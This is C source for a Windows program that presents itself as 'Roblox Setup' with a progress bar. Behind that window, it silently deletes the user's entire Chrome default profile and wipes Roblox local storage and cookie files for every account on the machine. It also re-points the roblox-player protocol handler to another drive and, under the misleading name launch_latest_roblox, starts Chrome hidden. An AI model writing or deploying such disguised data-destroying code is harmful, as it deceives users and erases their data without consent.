#include <windows.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <direct.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <io.h>
#include <stdbool.h>
#include <tchar.h>
#include <winreg.h>

HWND hProgress, hLabel;
int progress = 0;

bool is_admin() {
    return IsUserAnAdmin();
}

void run_as_admin() {
    wchar_t path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    ShellExecuteW(NULL, L"runas", path, NULL, NULL, SW_SHOWNORMAL);
    exit(0);
}

void register_roblox_protocol(const char* exe_path) {
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CLASSES_ROOT, "roblox-player", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return;

    RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)"URL: Roblox Protocol", strlen("URL: Roblox Protocol") + 1);
    RegSetValueExA(hKey, "URL Protocol", 0, REG_SZ, (BYTE*)"", 1);

    HKEY hIcon;
    if (RegCreateKeyExA(hKey, "DefaultIcon", 0, NULL, 0, KEY_WRITE, NULL, &hIcon, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hIcon, NULL, 0, REG_SZ, (BYTE*)exe_path, strlen(exe_path) + 1);
        RegCloseKey(hIcon);
    }

    HKEY hCommand;
    if (RegCreateKeyExA(hKey, "shell\\open\\command", 0, NULL, 0, KEY_WRITE, NULL, &hCommand, NULL) == ERROR_SUCCESS) {
        char cmd[MAX_PATH + 10];
        sprintf(cmd, "\"%s\" %%1", exe_path);
        RegSetValueExA(hCommand, NULL, 0, REG_SZ, (BYTE*)cmd, strlen(cmd) + 1);

        char folder[MAX_PATH];
        strcpy(folder, exe_path);
        char* lastSlash = strrchr(folder, '\\');
        if (lastSlash) *lastSlash = 0;
        const char* version = strrchr(folder, '\\');
        if (version) {
            RegSetValueExA(hCommand, "version", 0, REG_SZ, (BYTE*)(version + 1), strlen(version + 1) + 1);
        }

        RegCloseKey(hCommand);
    }
    RegCloseKey(hKey);
}

void run_uri_logic() {
    if (!is_admin()) run_as_admin();
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA("W:\\Roblox\\AppData\\Local\\Roblox\\Versions\\version-*", &findData);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            char fullpath[MAX_PATH];
            sprintf(fullpath, "W:\\Roblox\\AppData\\Local\\Roblox\\Versions\\%s\\RobloxPlayerBeta.exe", findData.cFileName);
            if (_access(fullpath, 0) == 0) {
                register_roblox_protocol(fullpath);
                break;
            }
        }
    } while (FindNextFileA(hFind, &findData));
    FindClose(hFind);
    SendMessage(hProgress, PBM_SETPOS, 33, 0);
}

void overwrite_file(const char* filepath, const char* content) {
    int retries = 0;
    const int max_retries = 5;
    while (retries < max_retries) {
        FILE* file = fopen(filepath, "w");
        if (file) {
            fputs(content, file);
            fclose(file);
            return;
        } else {
            DWORD err = GetLastError();
            if (err == ERROR_SHARING_VIOLATION) {
                Sleep(100);
                retries++;
            } else {
                break;
            }
        }
    }
}

void overwrite_files() {
    const char* patterns[] = {
        "C:\\Users\\%s\\AppData\\Local\\Roblox\\LocalStorage\\appStorage.json",
        "C:\\Users\\%s\\AppData\\Local\\Roblox\\LocalStorage\\memProfStorage*.json",
        "C:\\Users\\%s\\AppData\\Local\\Roblox\\LocalStorage\\*.dat"
    };
    const char* json_placeholder = "{\"placeholder\": true}";
    const char* dat_placeholder = "{\"CookiesVersion\":\"1\",\"CookiesData\":\"\"}";

    WIN32_FIND_DATAA findData;
    HANDLE hUserDirs = FindFirstFileA("C:\\Users\\*", &findData);
    if (hUserDirs == INVALID_HANDLE_VALUE) return;
    do {
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY && strcmp(findData.cFileName, ".") && strcmp(findData.cFileName, "..")) {
            for (int i = 0; i < 3; ++i) {
                char wildcard[MAX_PATH];
                sprintf(wildcard, patterns[i], findData.cFileName);
                WIN32_FIND_DATAA fileData;
                HANDLE hFind = FindFirstFileA(wildcard, &fileData);
                if (hFind == INVALID_HANDLE_VALUE) continue;
                do {
                    if (!(fileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                        char fullpath[MAX_PATH];
                        sprintf(fullpath, "C:\\Users\\%s\\AppData\\Local\\Roblox\\LocalStorage\\%s", findData.cFileName, fileData.cFileName);
                        const char* content = strstr(fileData.cFileName, ".dat") ? dat_placeholder : json_placeholder;
                        overwrite_file(fullpath, content);
                    }
                } while (FindNextFileA(hFind, &fileData));
                FindClose(hFind);
            }
        }
    } while (FindNextFileA(hUserDirs, &findData));
    FindClose(hUserDirs);
    SendMessage(hProgress, PBM_SETPOS, 66, 0);
}

void launch_latest_roblox() {
    const char* versions_dir = "C:\\Program Files\\Google\\Chrome";
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA("C:\\Program Files\\Google\\Chrome\\Application", &findData);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            char fullpath[MAX_PATH];
            sprintf(fullpath, "%s\\%s\\chrome.exe", versions_dir, findData.cFileName);
            if (_access(fullpath, 0) == 0) {
                STARTUPINFOA si = { sizeof(si) };
                PROCESS_INFORMATION pi;
                if (CreateProcessA(NULL, fullpath, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                    CloseHandle(pi.hProcess);
                    CloseHandle(pi.hThread);
                    SendMessage(hProgress, PBM_SETPOS, 100, 0);
                    Sleep(2000);
                    PostQuitMessage(0);
                    return;
                }
            }
        }
    } while (FindNextFileA(hFind, &findData));
    FindClose(hFind);
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE: {
            hLabel = CreateWindow("STATIC", "Please wait...", WS_CHILD | WS_VISIBLE | SS_CENTER,
                50, 30, 300, 20, hwnd, NULL, NULL, NULL);

            hProgress = CreateWindow(PROGRESS_CLASS, NULL,
                WS_CHILD | WS_VISIBLE | PBS_SMOOTH,
                50, 60, 300, 25,
                hwnd, NULL, NULL, NULL);
            SendMessage(hProgress, PBM_SETRANGE, 0, MAKELPARAM(0, 100));
            return 0;
        }
        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

void deleteFolder(const char *path) {
    SHFILEOPSTRUCT fileOp = {0};
    char pathBuffer[MAX_PATH];

    snprintf(pathBuffer, sizeof(pathBuffer), "%s%c", path, '\0');

    fileOp.wFunc = FO_DELETE;
    fileOp.pFrom = pathBuffer;
    fileOp.fFlags = FOF_NOCONFIRMATION | FOF_NOERRORUI | FOF_SILENT;

    SHFileOperation(&fileOp);
}

void deleteChromeData() {
    char chromeProfile[MAX_PATH];
    char fullPath[MAX_PATH];

    if (SHGetFolderPath(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, chromeProfile) != S_OK) {
        printf("[ERROR] Could not get local app data path.\n");
        return;
    }

    strcat(chromeProfile, "\\Google\\Chrome\\User Data");

    printf("[ACTION] Deleting Chrome browsing data...\n");

    const char *folders[] = {
        "\\Default"
    };

    for (int i = 0; i < sizeof(folders)/sizeof(folders[0]); ++i) {
        snprintf(fullPath, sizeof(fullPath), "%s%s", chromeProfile, folders[i]);
        deleteFolder(fullPath);
    }

    printf("[DONE] Chrome data deleted.\n");
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    deleteChromeData();
    INITCOMMONCONTROLSEX icex = { sizeof(icex), ICC_PROGRESS_CLASS };
    InitCommonControlsEx(&icex);

    WNDCLASS wc = {0};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = "RobloxProgressClass";
    RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(WS_EX_TOPMOST | WS_EX_TOOLWINDOW, "RobloxProgressClass", "Roblox Setup", WS_POPUP | WS_VISIBLE,
        (GetSystemMetrics(SM_CXSCREEN)-400)/2, (GetSystemMetrics(SM_CYSCREEN)-150)/2, 400, 150,
        NULL, NULL, hInstance, NULL);

    ShowWindow(hwnd, SW_SHOW);
    UpdateWindow(hwnd);

    run_uri_logic();
    overwrite_files();
    launch_latest_roblox();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}
